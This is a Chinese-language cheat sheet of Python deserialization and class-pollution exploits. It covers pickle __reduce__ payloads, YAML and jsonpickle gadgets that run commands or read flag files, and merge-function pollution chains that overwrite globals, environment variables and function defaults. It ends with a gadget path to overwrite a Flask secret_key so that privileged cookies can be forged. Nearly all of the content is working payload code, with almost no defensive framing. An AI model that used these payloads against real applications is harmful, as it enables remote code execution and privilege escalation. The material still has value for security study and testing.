# Python反序列化漏洞

## Pickle

cp.py
```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}".format(auth_token))

new_token = raw_input("New Auth Token : ")
try:
    token = cPickle.loads(b64decode(new_token))
    if not isinstance(token, User):
        raise TypeError("The token is not an instance of User")
    print "Welcome {}".format(token.username)
except (TypeError, cPickle.UnpicklingError):
    print "Invalid token!"
```

pickle.py
```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))  //执行的系统命令

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

## YAML

Payload
```
!!python/object/new:os.system ["whoami"]命令
```

脚本
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)
```

执行sleep
```
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```

未指定加载器利用
```
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

一行
```
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```

远程代码执行
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```

工具

[python deserialization attack payload generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)

## Json

```
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}
```

## 类污染

简单示例
```python
import pickle

user_input = '{"__class__": "myapp.MyClass", "__dict__": {"__init__": lambda self: exec("import os; os.system(\'pwd\')")}}'
obj = pickle.loads(user_input)
```

### 字符串污染对象示例
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

### 基本漏洞示例
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


USER_INPUT = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
        "name":"Sarah"
    }
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

### 为RCE创建类属性默认值
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
    def execute_command(self):
        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

USER_INPUT = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"
            }
        }
    }
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```

### 污染其它类和全局变量
```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```

### 任意子进程执行系统命令
```python
import subprocess, json

class Employee:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```

### 覆盖__kwdefaults__
```python
from os import system
import json

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Employee:
    def __init__(self):
        pass

def execute(*, command='whoami'):
    print(f'Executing {command}')
    system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```

### 跨文件覆盖Flask密钥

如果可以对 python 文件中定义的对象进行类污染，但该对象的类定义在与主文件不同的文件中。 为了访问前面的有效负载中的 __globals__ ，需要访问对象的类或类的方法，将能够访问该文件中的全局变量，但不能访问主文件中的全局变量

因此，将无法访问在主页中定义密钥的 Flask 应用程序全局对象：
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

在这种情况下，需要一个小工具来遍历文件以到达主文件，以访问全局对象 app.secret_key 来更改 Flask 密钥，并能够在知道该密钥的情况下升级权限
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

使用此有效负载更改 app.secret_key（应用程序中的名称可能不同），以便能够签署新的和更多权限的 Flask cookie
